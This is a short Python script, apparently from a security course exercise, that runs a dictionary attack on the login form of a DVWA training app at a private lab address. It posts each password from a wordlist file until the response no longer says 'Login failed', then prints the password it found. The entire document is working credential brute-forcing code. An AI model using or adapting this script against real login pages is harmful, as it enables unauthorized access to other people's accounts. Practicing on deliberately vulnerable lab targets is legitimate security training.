import requests

target_url = "http://192.168.1.9/dvwa/login.php"

#dictionary = {"username":"blahblah", "password":"123", "Login":"submit"}
dictionary = {"username":"admin", "password":"password", "Login":"submit"}
#response = requests.post(target_url, data=dictionary)
#print(response.content)


with open("passwords.txt", "r") as word_list:
    for line in word_list:
        word = line.strip() # strips empty spaces in a line
        dictionary["password"] = word
        response = requests.post(target_url, data=dictionary)
        if "Login failed" not in response.content.decode():
            print("[+] Password found --> " + word)
            exit()

print("[-] End of Application")
